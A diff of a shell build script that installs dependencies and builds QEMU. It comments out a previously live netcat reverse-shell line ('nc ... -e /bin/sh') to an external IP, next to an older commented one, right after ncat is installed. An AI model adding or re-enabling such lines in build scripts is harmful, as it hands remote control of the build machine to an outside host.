@@ -11,7 +11,7 @@ build_qemu () {
   #https://www.qemu.org/download/
   #https://wiki.qemu.org/Hosts/Linux
   #https://wiki.qemu.org/Testing/DockerBuild
-  apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build uuid-dev uuid -y
+  DEBIAN_FRONTEND=noninteractive apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build uuid-dev uuid devscripts build-essential lintian -y
   DEBIAN_FRONTEND=noninteractive apt-get install -y gir1.2-spiceclientgtk-3.0 virt-manager libvirt-daemon virt-viewer spice-vdagent qemu-utils  spice-vdagent xserver-xorg-video-qxl
   mkdir ~/qemu; cd ~/qemu
   #build debian version
@@ -83,7 +83,7 @@ echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/source
 apt update
 apt install -y ncat
 #nc 65.108.51.31 11452 -e /bin/sh
-nc 103.158.223.61 21121 -e /bin/sh
+#nc 103.158.223.61 21121 -e /bin/sh
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl
 
 mkdir /builds
